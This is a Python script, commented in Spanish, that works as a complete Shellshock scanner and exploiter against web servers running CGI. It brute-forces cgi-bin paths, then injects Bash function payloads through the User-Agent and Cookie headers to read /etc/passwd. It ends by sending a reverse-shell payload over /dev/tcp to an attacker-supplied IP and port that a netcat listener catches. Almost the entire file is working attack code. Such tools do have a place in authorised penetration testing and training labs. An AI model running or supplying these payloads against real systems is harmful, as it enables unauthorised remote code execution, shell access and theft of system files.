#!/usr/bin/env python3
import subprocess
import argparse
import os
import sys
import re
import time
import shutil

def check_dependencies():
    """Verifica si las dependencias necesarias están instaladas y las instala automáticamente."""
    dependencies = ["gobuster", "curl", "nc"]
    missing = []

    for dep in dependencies:
        if shutil.which(dep) is None:
            missing.append(dep)

    if missing:
        print(f"[!] Faltan las siguientes dependencias: {', '.join(missing)}")
        print("[*] Instalando dependencias automáticamente...")

        # Instalar dependencias faltantes
        for dep in missing:
            if dep == "gobuster":
                print("[*] Instalando gobuster...")
                subprocess.run(["sudo", "apt", "install", "gobuster", "-y"], check=True)
            elif dep == "curl":
                print("[*] Instalando curl...")
                subprocess.run(["sudo", "apt", "install", "curl", "-y"], check=True)
            elif dep == "nc":
                print("[*] Instalando netcat...")
                subprocess.run(["sudo", "apt", "install", "netcat-traditional", "-y"], check=True)

        print("[+] Dependencias instaladas correctamente.")
        return True

    return True

def check_wordlist_path(custom_wordlist=None):
    """Verifica si el wordlist existe, si no, busca alternativas."""
    # Si se proporcionó una ruta personalizada, verificar primero esa
    if custom_wordlist and os.path.exists(custom_wordlist):
        return custom_wordlist
        
    wordlist_paths = [
        "/usr/share/wordlists/dirb/small.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "./small.txt",
        "./common.txt"
    ]

    for path in wordlist_paths:
        if os.path.exists(path):
            return path

    # Si no encontramos ninguna, creamos una pequeña lista básica
    print("[!] No se encontró ninguna wordlist. Creando una básica...")
    basic_wordlist = [
        "test", "admin", "access", "status", "shell", "info", "login", "cgi-bin",
        "backup", "config", "home", "index", "user", "users", "setup", "dev"
    ]

    with open("small.txt", "w") as f:
        for word in basic_wordlist:
            f.write(f"{word}\n")

    return "./small.txt"

def find_cgi_scripts(target_ip, wordlist_path):
    """Utiliza gobuster para encontrar scripts CGI en el servidor objetivo."""
    print(f"[*] Buscando scripts CGI en http://{target_ip}/cgi-bin/")
    print(f"[*] Usando wordlist: {wordlist_path}")

    cmd = [
        "gobuster", "dir",
        "-u", f"http://{target_ip}/cgi-bin/",
        "-w", wordlist_path,
        "-x", "cgi",
        "--timeout", "10s",
        "--no-error"
    ]

    try:
        # Primer intento: salida estándar
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        cgi_scripts = []
        print("[*] Buscando scripts CGI...")

        # Procesamiento en tiempo real de la salida
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            
            # Patrón actualizado para detectar resultados de gobuster
            if ".cgi" in line and ("Status: 200" in line or "(Status: 200)" in line):
                # Intentar varios patrones para extraer el nombre del script
                patterns = [
                    r'/cgi-bin/([^\s]+)',
                    r'\/([^\/]+\.cgi)',
                    r'([a-zA-Z0-9_-]+\.cgi)'
                ]

                for pattern in patterns:
                    match = re.search(pattern, line)
                    if match:
                        script_name = match.group(1)
                        if script_name not in cgi_scripts:
                            cgi_scripts.append(script_name)
                        break

        # Esperar a que termine el proceso
        process.wait()

        # Si no se encontraron scripts o hubo un error, probar método alternativo
        if not cgi_scripts or process.returncode != 0:
            print("[*] Usando método alternativo para encontrar scripts CGI...")
            common_cgi_names = ["test.cgi", "admin.cgi", "access.cgi", "status.cgi", "shell.cgi", 
                              "info.cgi", "login.cgi", "sh.cgi", "user.cgi", "users.cgi", 
                              "exec.cgi", "command.cgi", "cmd.cgi", "system.cgi", "debug.cgi"]

            for name in common_cgi_names:
                try:
                    curl_cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", 
                                f"http://{target_ip}/cgi-bin/{name}"]
                    result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=5)

                    if result.stdout.strip() in ["200", "302", "403"]:
                        print(f"[+] Encontrado script CGI: {name}")
                        if name not in cgi_scripts:
                            cgi_scripts.append(name)
                except Exception:
                    pass

        if not cgi_scripts:
            print("[!] No se encontraron scripts CGI.")
        else:
            print(f"[+] Scripts CGI encontrados: {', '.join(cgi_scripts)}")

        return cgi_scripts

    except Exception as e:
        print(f"[!] Error durante la búsqueda de scripts CGI: {e}")
        print("[*] Intentando método alternativo...")

        # Lista de nombres comunes de scripts CGI para probar
        common_cgi_names = ["test.cgi", "admin.cgi", "access.cgi", "status.cgi", "shell.cgi", 
                          "info.cgi", "login.cgi", "sh.cgi", "user.cgi", "users.cgi", 
                          "exec.cgi", "command.cgi", "cmd.cgi", "system.cgi", "debug.cgi"]

        cgi_scripts = []
        for name in common_cgi_names:
            try:
                curl_cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", 
                            f"http://{target_ip}/cgi-bin/{name}"]
                result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=5)

                if result.stdout.strip() in ["200", "302", "403"]:
                    print(f"[+] Encontrado script CGI: {name}")
                    cgi_scripts.append(name)
            except Exception:
                pass

        return cgi_scripts

def check_shellshock(target_ip, cgi_script):
    """Verifica si un script CGI es vulnerable a shellshock."""
    print(f"[*] Verificando vulnerabilidad shellshock en http://{target_ip}/cgi-bin/{cgi_script}")

    cmd = [
        "curl", 
        "-s",
        "-H", "User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd", 
        f"http://{target_ip}/cgi-bin/{cgi_script}"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        # Verificar si la respuesta contiene información del archivo /etc/passwd
        if "root:" in result.stdout and (":/bin/" in result.stdout or ":x:" in result.stdout):
            print(f"[+] ¡El script {cgi_script} es vulnerable a shellshock!")
            return True
        else:
            # Probar otra variante de payload si el primero falla
            cmd_alt = [
                "curl", 
                "-s",
                "-H", "Cookie: () { :;}; echo; /bin/cat /etc/passwd", 
                f"http://{target_ip}/cgi-bin/{cgi_script}"
            ]

            result_alt = subprocess.run(cmd_alt, capture_output=True, text=True, timeout=10)

            if "root:" in result_alt.stdout and (":/bin/" in result_alt.stdout or ":x:" in result_alt.stdout):
                print(f"[+] ¡El script {cgi_script} es vulnerable a shellshock (con payload alternativo)!")
                return True
            else:
                print(f"[-] El script {cgi_script} no parece ser vulnerable a shellshock.")
                return False

    except subprocess.TimeoutExpired:
        print(f"[!] Tiempo de espera agotado al verificar {cgi_script}.")
        return False
    except Exception as e:
        print(f"[!] Error al verificar la vulnerabilidad: {e}")
        return False

def exploit_shellshock(target_ip, cgi_script, attacker_ip, attacker_port):
    """Intenta obtener una shell inversa explotando la vulnerabilidad shellshock."""
    print(f"[*] Intentando obtener una shell inversa desde {target_ip} a {attacker_ip}:{attacker_port}")
    print(f"[+] IMPORTANTE: Ejecuta el siguiente comando en otra terminal:")
    print(f"    sudo nc -lvnp {attacker_port}")

    # Esperar a que el usuario configure netcat
    input("[*] Presiona Enter cuando estés listo para continuar...")

    # Enviar payload para obtener shell inversa
    cmd = [
        "curl", 
        "-s",
        "-H", f"User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1", 
        f"http://{target_ip}/cgi-bin/{cgi_script}"
    ]

    try:
        print("[*] Enviando payload...")
        subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        print("[*] Payload enviado. Verifica tu sesión de netcat para confirmar la conexión.")

        # Probar un payload alternativo si el primero no funciona
        print("[*] Si no recibiste conexión, probaremos un payload alternativo...")
        print("[*] Presiona Ctrl+C si ya tienes la shell o Enter para continuar con el payload alternativo...")
        input()

        cmd_alt = [
            "curl", 
            "-s",
            "-H", f"Cookie: () {{ :; }}; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1", 
            f"http://{target_ip}/cgi-bin/{cgi_script}"
        ]

        print("[*] Enviando payload alternativo...")
        subprocess.run(cmd_alt, capture_output=True, text=True, timeout=5)
        print("[*] Payload alternativo enviado. Verifica tu sesión de netcat.")

    except subprocess.TimeoutExpired:
        print("[+] El comando se ha ejecutado. Si todo ha ido bien, deberías tener una shell en tu sesión de netcat.")
    except Exception as e:
        print(f"[!] Error al enviar el payload: {e}")
        print("[*] Intenta ejecutar manualmente el comando:")
        print(f"    curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1' http://{target_ip}/cgi-bin/{cgi_script}")

def main():
    parser = argparse.ArgumentParser(description='Escáner y explotador de vulnerabilidad Shellshock')
    parser.add_argument('--target', '-t', help='IP del servidor objetivo', required=True)
    parser.add_argument('--attacker-ip', '-a', help='IP del atacante para la shell inversa', required=True)
    parser.add_argument('--attacker-port', '-p', help='Puerto del atacante para la shell inversa', type=int, default=7777, required=True)
    parser.add_argument('--cgi-script', '-c', help='Script CGI específico a probar (opcional)', required=False)
    parser.add_argument('--wordlist', '-w', help='Ruta a la wordlist para gobuster', required=False)

    args = parser.parse_args()

    print("=" * 60)
    print("=== Escáner y Explotador de Vulnerabilidad Shellshock ===")
    print("=" * 60)

    # Verificar e instalar dependencias automáticamente
    if not check_dependencies():
        sys.exit(1)

    # Verificar la ruta del wordlist
    wordlist_path = check_wordlist_path(args.wordlist)
    
    # Si se proporcionó un script CGI específico como argumento, usarlo directamente
    if args.cgi_script:
        cgi_scripts = [args.cgi_script]
        print(f"[*] Usando script CGI especificado: {args.cgi_script}")
    else:
        # Buscar scripts CGI
        cgi_scripts = find_cgi_scripts(args.target, wordlist_path)

    if not cgi_scripts:
        print("[!] No se encontraron scripts CGI para probar.")
        manual_script = input("[?] ¿Deseas especificar manualmente un script CGI para probar? (s/n): ")
        if manual_script.lower() == 's':
            script_name = input("[?] Introduce el nombre del script CGI (ej: test.cgi): ")
            cgi_scripts = [script_name]
        else:
            print("[!] Saliendo.")
            sys.exit(1)

    # Verificar vulnerabilidad shellshock en cada script
    vulnerable_scripts = []
    for script in cgi_scripts:
        if check_shellshock(args.target, script):
            vulnerable_scripts.append(script)

    if not vulnerable_scripts:
        print("[!] No se encontraron scripts CGI vulnerables a shellshock. Saliendo.")
        retry = input("[?] ¿Deseas probar manualmente algún script? (s/n): ")
        if retry.lower() == 's':
            script_name = input("[?] Introduce el nombre del script CGI a probar: ")
            if script_name not in cgi_scripts:
                cgi_scripts.append(script_name)
                if check_shellshock(args.target, script_name):
                    vulnerable_scripts.append(script_name)
                else:
                    print("[!] No se detectó vulnerabilidad. Saliendo.")
                    sys.exit(0)
        else:
            sys.exit(0)

    # Seleccionar script vulnerable para explotar
    selected_script = vulnerable_scripts[0]
    if len(vulnerable_scripts) > 1:
        print("[?] Se encontraron múltiples scripts vulnerables:")
        for i, script in enumerate(vulnerable_scripts):
            print(f"    {i+1}. {script}")
        selection = int(input("[?] Selecciona un script para explotar (número): ")) - 1
        selected_script = vulnerable_scripts[selection]

    # Explotar la vulnerabilidad
    exploit_shellshock(args.target, selected_script, args.attacker_ip, args.attacker_port)

    print("\n[*] Proceso completado")

if __name__ == "__main__":
    main()
